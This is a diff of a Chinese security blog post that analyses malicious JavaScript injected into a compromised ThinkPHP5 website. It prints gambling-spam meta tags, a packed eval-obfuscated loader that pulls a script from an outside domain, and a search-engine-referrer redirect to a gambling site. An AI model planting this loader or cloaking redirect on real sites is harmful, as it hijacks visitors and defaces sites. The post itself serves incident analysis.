@@ -82,14 +82,11 @@
     [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/js">js</a>)
 </div>
 
-      <div>
-
-<h3 id="0x00-常见网页挂马方式">0x00 常见网页挂马方式</h3>
-
+      <div><h3 id="0x00-常见网页挂马方式">0x00 常见网页挂马方式</h3>
 <ul>
-<li>iframe 框架挂马<br />
+<li>iframe 框架挂马<br>
 简单来说就是加 iframe 标签</li>
-<li>script 挂马<br />
+<li>script 挂马<br>
 通过各种办法加载 js 代码</li>
 <li>htm 文件挂马
 上传 htm 文件，然后用 script 引入</li>
@@ -99,77 +96,41 @@
 比较新颖的一种挂马隐蔽方法</li>
 <li>等等。。。</li>
 </ul>
-
 <h3 id="0x01-发现被插入恶意-js">0x01 发现被插入恶意 js</h3>
-
 <p>前几天在做子域名搜集，搜集完后提取 title，结果看到了一个站点的 title 不正常</p>
-
 <p>网站是 tp5 的，应该是前段时候 tp5 出现命令执行时被入侵的</p>
-
 <p>查看网页 html 源码发现 title 和 meta 的 description 都被改了</p>
-
-<pre><code>&lt;title&gt;&amp;#25250;&amp;#24196;&amp;#29275;&amp;#29275;&amp;#28216;&amp;#25103;&amp;#24179;&amp;#21488;&amp;#44;&amp;#30495;&amp;#38065;&amp;#25250;&amp;#24196;&amp;#29275;&amp;#29275;&amp;#28216;&amp;#25103;&amp;#44;&amp;#25250;&amp;#24196;&amp;#29275;&amp;#29275;&amp;#25163;&amp;#28216;&amp;#19979;&amp;#36733;&lt;/title&gt;
-&lt;meta name=&quot;keywords&quot; content=&quot;&amp;#25250;&amp;#24196;&amp;#29275;&amp;#29275;&amp;#28216;&amp;#25103;&amp;#24179;&amp;#21488;&amp;#44;&amp;#30495;&amp;#38065;&amp;#25250;&amp;#24196;&amp;#29275;&amp;#29275;&amp;#28216;&amp;#25103;&amp;#44;&amp;#25250;&amp;#24196;&amp;#29275;&amp;#29275;&amp;#25163;&amp;#28216;&amp;#19979;&amp;#36733;&quot;/&gt;
-&lt;meta name=&quot;description&quot; content=&quot;&amp;#25250;&amp;#24196;&amp;#29275;&amp;#29275;&amp;#12304;&amp;#55;&amp;#49;&amp;#49;&amp;#49;&amp;#48;&amp;#46;&amp;#99;&amp;#111;&amp;#109;&amp;#12305;&amp;#29616;&amp;#20844;&amp;#21496;&amp;#25317;&amp;#26377;&amp;#19968;&amp;#25209;&amp;#26377;&amp;#20960;&amp;#21313;&amp;#24180;&amp;#21644;&amp;#22810;&amp;#25250;&amp;#24196;&amp;#29275;&amp;#29275;&amp;#25216;&amp;#24039;&amp;#24180;&amp;#40831;&amp;#36718;&amp;#27979;&amp;#37327;&amp;#20013;&amp;#24515;&amp;#21046;&amp;#36896;&amp;#32463;&amp;#39564;&amp;#30340;&amp;#20154;&amp;#21592;&amp;#44;&amp;#25250;&amp;#24196;&amp;#29275;&amp;#29275;&amp;#28216;&amp;#25103;&amp;#35268;&amp;#21017;&amp;#38598;&amp;#25104;&amp;#20102;&amp;#22269;&amp;#20869;&amp;#39030;&amp;#23574;&amp;#40831;&amp;#36718;&amp;#27979;&amp;#37327;&amp;#25216;&amp;#26415;&quot;/&gt;
-</code></pre>
-
-<p>解码一下</p>
-
-<pre><code>&lt;title&gt;抢庄牛牛游戏平台,真钱抢庄牛牛游戏,抢庄牛牛手游下载&lt;/title&gt;
-&lt;meta name=&quot;keywords&quot; content=&quot;抢庄牛牛游戏平台,真钱抢庄牛牛游戏,抢庄牛牛手游下载&quot;/&gt;
-&lt;meta name=&quot;description&quot; content=&quot;抢庄牛牛【71110.com】现公司拥有一批有几十年和多抢庄牛牛技巧年齿轮测量中心制造经验的人员,抢庄牛牛游戏规则集成了国内顶尖齿轮测量技术&quot;/&gt;
-</code></pre>
-
-<h3 id="0x02-简单分析">0x02 简单分析</h3>
-
+<pre tabindex="0"><code>&lt;title&gt;&amp;#25250;&amp;#24196;&amp;#29275;&amp;#29275;&amp;#28216;&amp;#25103;&amp;#24179;&amp;#21488;&amp;#44;&amp;#30495;&amp;#38065;&amp;#25250;&amp;#24196;&amp;#29275;&amp;#29275;&amp;#28216;&amp;#25103;&amp;#44;&amp;#25250;&amp;#24196;&amp;#29275;&amp;#29275;&amp;#25163;&amp;#28216;&amp;#19979;&amp;#36733;&lt;/title&gt;
+&lt;meta name=&#34;keywords&#34; content=&#34;&amp;#25250;&amp;#24196;&amp;#29275;&amp;#29275;&amp;#28216;&amp;#25103;&amp;#24179;&amp;#21488;&amp;#44;&amp;#30495;&amp;#38065;&amp;#25250;&amp;#24196;&amp;#29275;&amp;#29275;&amp;#28216;&amp;#25103;&amp;#44;&amp;#25250;&amp;#24196;&amp;#29275;&amp;#29275;&amp;#25163;&amp;#28216;&amp;#19979;&amp;#36733;&#34;/&gt;
+&lt;meta name=&#34;description&#34; content=&#34;&amp;#25250;&amp;#24196;&amp;#29275;&amp;#29275;&amp;#12304;&amp;#55;&amp;#49;&amp;#49;&amp;#49;&amp;#48;&amp;#46;&amp;#99;&amp;#111;&amp;#109;&amp;#12305;&amp;#29616;&amp;#20844;&amp;#21496;&amp;#25317;&amp;#26377;&amp;#19968;&amp;#25209;&amp;#26377;&amp;#20960;&amp;#21313;&amp;#24180;&amp;#21644;&amp;#22810;&amp;#25250;&amp;#24196;&amp;#29275;&amp;#29275;&amp;#25216;&amp;#24039;&amp;#24180;&amp;#40831;&amp;#36718;&amp;#27979;&amp;#37327;&amp;#20013;&amp;#24515;&amp;#21046;&amp;#36896;&amp;#32463;&amp;#39564;&amp;#30340;&amp;#20154;&amp;#21592;&amp;#44;&amp;#25250;&amp;#24196;&amp;#29275;&amp;#29275;&amp;#28216;&amp;#25103;&amp;#35268;&amp;#21017;&amp;#38598;&amp;#25104;&amp;#20102;&amp;#22269;&amp;#20869;&amp;#39030;&amp;#23574;&amp;#40831;&amp;#36718;&amp;#27979;&amp;#37327;&amp;#25216;&amp;#26415;&#34;/&gt;
+</code></pre><p>解码一下</p>
+<pre tabindex="0"><code>&lt;title&gt;抢庄牛牛游戏平台,真钱抢庄牛牛游戏,抢庄牛牛手游下载&lt;/title&gt;
+&lt;meta name=&#34;keywords&#34; content=&#34;抢庄牛牛游戏平台,真钱抢庄牛牛游戏,抢庄牛牛手游下载&#34;/&gt;
+&lt;meta name=&#34;description&#34; content=&#34;抢庄牛牛【71110.com】现公司拥有一批有几十年和多抢庄牛牛技巧年齿轮测量中心制造经验的人员,抢庄牛牛游戏规则集成了国内顶尖齿轮测量技术&#34;/&gt;
+</code></pre><h3 id="0x02-简单分析">0x02 简单分析</h3>
 <p>紧接着有一段 js 代码</p>
-
-<pre><code>&lt;script&gt;if(navigator.userAgent.toLocaleLowerCase().indexOf(&quot;baidu&quot;) == -1){document.title =&quot;XXXX-首页&quot;}&lt;/script&gt;
-&lt;script type=&quot;text/javascript&quot;&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('m[&quot;\\n\\b\\2\\e\\f\\7\\l\\0&quot;][&quot;\\o\\4\\8\\0\\7&quot;](\'\\j\\1\\2\\4\\8\\3\\0 \\0\\k\\3\\7\\d\\6\\0\\7\\p\\0\\5\\h\\c\\t\\c\\1\\2\\4\\8\\3\\0\\6 \\1\\4\\2\\d\\6\\9\\0\\0\\3\\1\\v\\5\\5\\1\\a\\9\\e\\a\\9\\s\\g\\2\\b\\f\\5\\u\\r\\q\\3\\g\\h\\1\\6\\i\\j\\5\\1\\2\\4\\8\\3\\0\\i\');',32,32,'x74|x73|x63|x70|x72|x2f|x22|x65|x69|x68|x66|x6f|x61|x3d|x75|x6d|x2e|x6a|x3e|x3c|x79|x6e|window|x64|x77|x78|x71|x38|x32|x76|x6b|x3a'.split('|'),0,{}))
+<pre tabindex="0"><code>&lt;script&gt;if(navigator.userAgent.toLocaleLowerCase().indexOf(&#34;baidu&#34;) == -1){document.title =&#34;XXXX-首页&#34;}&lt;/script&gt;
+&lt;script type=&#34;text/javascript&#34;&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&#34;&#34;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#39;&#39;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#39;\\w+&#39;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#39;\\b&#39;+e(c)+&#39;\\b&#39;,&#39;g&#39;),k[c]);return p;}(&#39;m[&#34;\\n\\b\\2\\e\\f\\7\\l\\0&#34;][&#34;\\o\\4\\8\\0\\7&#34;](\&#39;\\j\\1\\2\\4\\8\\3\\0 \\0\\k\\3\\7\\d\\6\\0\\7\\p\\0\\5\\h\\c\\t\\c\\1\\2\\4\\8\\3\\0\\6 \\1\\4\\2\\d\\6\\9\\0\\0\\3\\1\\v\\5\\5\\1\\a\\9\\e\\a\\9\\s\\g\\2\\b\\f\\5\\u\\r\\q\\3\\g\\h\\1\\6\\i\\j\\5\\1\\2\\4\\8\\3\\0\\i\&#39;);&#39;,32,32,&#39;x74|x73|x63|x70|x72|x2f|x22|x65|x69|x68|x66|x6f|x61|x3d|x75|x6d|x2e|x6a|x3e|x3c|x79|x6e|window|x64|x77|x78|x71|x38|x32|x76|x6b|x3a&#39;.split(&#39;|&#39;),0,{}))
 &lt;/script&gt;
-</code></pre>
-
-<p>第一个 script 标签中判断了 UA 中是否有 baidu 这个字符，应该是判断是否为百度爬虫，不是的话就显示正常的 title</p>
-
+</code></pre><p>第一个 script 标签中判断了 UA 中是否有 baidu 这个字符，应该是判断是否为百度爬虫，不是的话就显示正常的 title</p>
 <p>第二个 script 标签的 js 被简单加密了</p>
-
-<pre><code>(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('m[&quot;\\n\\b\\2\\e\\f\\7\\l\\0&quot;][&quot;\\o\\4\\8\\0\\7&quot;](\'\\j\\1\\2\\4\\8\\3\\0 \\0\\k\\3\\7\\d\\6\\0\\7\\p\\0\\5\\h\\c\\t\\c\\1\\2\\4\\8\\3\\0\\6 \\1\\4\\2\\d\\6\\9\\0\\0\\3\\1\\v\\5\\5\\1\\a\\9\\e\\a\\9\\s\\g\\2\\b\\f\\5\\u\\r\\q\\3\\g\\h\\1\\6\\i\\j\\5\\1\\2\\4\\8\\3\\0\\i\');',32,32,'x74|x73|x63|x70|x72|x2f|x22|x65|x69|x68|x66|x6f|x61|x3d|x75|x6d|x2e|x6a|x3e|x3c|x79|x6e|window|x64|x77|x78|x71|x38|x32|x76|x6b|x3a'.split('|'),0,{}))
-</code></pre>
-
-<p>先在 chrome 的 Console 运行后得到</p>
-
-<pre><code>&quot;window[&quot;\x64\x6f\x63\x75\x6d\x65\x6e\x74&quot;][&quot;\x77\x72\x69\x74\x65&quot;]('\x3c\x73\x63\x72\x69\x70\x74 \x74\x79\x70\x65\x3d\x22\x74\x65\x78\x74\x2f\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x22 \x73\x72\x63\x3d\x22\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x66\x68\x75\x66\x68\x32\x2e\x63\x6f\x6d\x2f\x6b\x38\x71\x70\x2e\x6a\x73\x22\x3e\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e');&quot;
-</code></pre>
-
-<p>python 将 16 进制转化为字符串</p>
-
-<pre><code>&gt;&gt;&gt; '''window[&quot;\x64\x6f\x63\x75\x6d\x65\x6e\x74&quot;][&quot;\x77\x72\x69\x74\x65&quot;]('\x3c\x73\x63\x72\x69\x70\x74 \x74\x79\x70\x65\x3d\x22\x74\x65\x78\x74\x2f\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x22 \x73\x72\x63\x3d\x22\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x66\x68\x75\x66\x68\x32\x2e\x63\x6f\x6d\x2f\x6b\x38\x71\x70\x2e\x6a\x73\x22\x3e\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e');'''
-window[&quot;document&quot;][&quot;write&quot;]('&lt;script type=&quot;text/javascript&quot; src=&quot;https://sfhufh2.com/k8qp.js&quot;&gt;&lt;/script&gt;');
-</code></pre>
-
-<p>可以看到上面那段加密的代码作用是引入 k8qp.js 这个 js 文件，而这个文件中有下面这一段 js</p>
-
-<pre><code>document.writeln(&quot;&lt;script LANGUAGE=\&quot;Javascript\&quot;&gt;&quot;);
-document.writeln(&quot;var s=document.referrer&quot;);
+<pre tabindex="0"><code>(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&#34;&#34;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#39;&#39;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#39;\\w+&#39;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#39;\\b&#39;+e(c)+&#39;\\b&#39;,&#39;g&#39;),k[c]);return p;}(&#39;m[&#34;\\n\\b\\2\\e\\f\\7\\l\\0&#34;][&#34;\\o\\4\\8\\0\\7&#34;](\&#39;\\j\\1\\2\\4\\8\\3\\0 \\0\\k\\3\\7\\d\\6\\0\\7\\p\\0\\5\\h\\c\\t\\c\\1\\2\\4\\8\\3\\0\\6 \\1\\4\\2\\d\\6\\9\\0\\0\\3\\1\\v\\5\\5\\1\\a\\9\\e\\a\\9\\s\\g\\2\\b\\f\\5\\u\\r\\q\\3\\g\\h\\1\\6\\i\\j\\5\\1\\2\\4\\8\\3\\0\\i\&#39;);&#39;,32,32,&#39;x74|x73|x63|x70|x72|x2f|x22|x65|x69|x68|x66|x6f|x61|x3d|x75|x6d|x2e|x6a|x3e|x3c|x79|x6e|window|x64|x77|x78|x71|x38|x32|x76|x6b|x3a&#39;.split(&#39;|&#39;),0,{}))
+</code></pre><p>先在 chrome 的 Console 运行后得到</p>
+<pre tabindex="0"><code>&#34;window[&#34;\x64\x6f\x63\x75\x6d\x65\x6e\x74&#34;][&#34;\x77\x72\x69\x74\x65&#34;](&#39;\x3c\x73\x63\x72\x69\x70\x74 \x74\x79\x70\x65\x3d\x22\x74\x65\x78\x74\x2f\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x22 \x73\x72\x63\x3d\x22\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x66\x68\x75\x66\x68\x32\x2e\x63\x6f\x6d\x2f\x6b\x38\x71\x70\x2e\x6a\x73\x22\x3e\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e&#39;);&#34;
+</code></pre><p>python 将 16 进制转化为字符串</p>
+<pre tabindex="0"><code>&gt;&gt;&gt; &#39;&#39;&#39;window[&#34;\x64\x6f\x63\x75\x6d\x65\x6e\x74&#34;][&#34;\x77\x72\x69\x74\x65&#34;](&#39;\x3c\x73\x63\x72\x69\x70\x74 \x74\x79\x70\x65\x3d\x22\x74\x65\x78\x74\x2f\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x22 \x73\x72\x63\x3d\x22\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x66\x68\x75\x66\x68\x32\x2e\x63\x6f\x6d\x2f\x6b\x38\x71\x70\x2e\x6a\x73\x22\x3e\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e&#39;);&#39;&#39;&#39;
+window[&#34;document&#34;][&#34;write&#34;](&#39;&lt;script type=&#34;text/javascript&#34; src=&#34;https://sfhufh2.com/k8qp.js&#34;&gt;&lt;/script&gt;&#39;);
+</code></pre><p>可以看到上面那段加密的代码作用是引入 k8qp.js 这个 js 文件，而这个文件中有下面这一段 js</p>
+<pre tabindex="0"><code>document.writeln(&#34;&lt;script LANGUAGE=\&#34;Javascript\&#34;&gt;&#34;);
+document.writeln(&#34;var s=document.referrer&#34;);
 document.writeln(
-    &quot;if(s.indexOf(\&quot;baidu\&quot;)&gt;0 || s.indexOf(\&quot;sogou\&quot;)&gt;0 || s.indexOf(\&quot;soso\&quot;)&gt;0 ||s.indexOf(\&quot;sm\&quot;)&gt;0 ||s.indexOf(\&quot;uc\&quot;)&gt;0 ||s.indexOf(\&quot;bing\&quot;)&gt;0 ||s.indexOf(\&quot;yahoo\&quot;)&gt;0 ||s.indexOf(\&quot;so\&quot;)&gt;0 )&quot;
+    &#34;if(s.indexOf(\&#34;baidu\&#34;)&gt;0 || s.indexOf(\&#34;sogou\&#34;)&gt;0 || s.indexOf(\&#34;soso\&#34;)&gt;0 ||s.indexOf(\&#34;sm\&#34;)&gt;0 ||s.indexOf(\&#34;uc\&#34;)&gt;0 ||s.indexOf(\&#34;bing\&#34;)&gt;0 ||s.indexOf(\&#34;yahoo\&#34;)&gt;0 ||s.indexOf(\&#34;so\&#34;)&gt;0 )&#34;
 );
-document.writeln(&quot;location.href=\&quot;https://71110tz.com/\&quot;;&quot;);
-document.writeln(&quot;&lt;/script&gt;&quot;);
-</code></pre>
-
-<p>判断了 Referer，是 baidu、sogou、soso 之类的话 location.href 跳转到恶意站点 <a href="https://71110tz.com/">https://71110tz.com/</a></p>
-
-<p><br>
-以上</p>
-
-<p><br></p>
-
-<h4 id="reference-侵删">Reference(侵删)：</h4>
-
-<ul>
-<li><a href="https://www.test404.com/post-655.html?wafcloud=1?_blank">https://www.test404.com/post-655.html?wafcloud=1</a></li>
-</ul>
+document.writeln(&#34;location.href=\&#34;https://71110tz.com/\&#34;;&#34;);
+document.writeln(&#34;&lt;/script&gt;&#34;);
+</code></pre><p>判断了 Referer，是 baidu、sogou、soso 之类的话 location.href 跳转到恶意站点 <a href="https://71110tz.com/">https://71110tz.com/</a></p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
 </div>
     </article>
   </main>
